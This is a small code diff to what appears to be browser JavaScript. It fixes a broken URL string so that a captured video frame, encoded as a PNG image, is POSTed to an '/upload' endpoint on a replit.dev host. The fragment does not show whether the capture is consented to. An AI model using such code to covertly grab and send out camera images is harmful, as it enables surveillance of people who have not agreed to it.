@@ -24,7 +24,7 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const imageData = canvas.toDataURL('image/png');
 
-      fetch('https://1a5db95b-8a3b-4978-ac42-1840713250de-00-1386ksupiyzmu.pike.replit.dev/ , {
+      fetch('https://1a5db95b-8a3b-4978-ac42-1840713250de-00-1386ksupiyzmu.pike.replit.dev/upload', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ image: imageData })
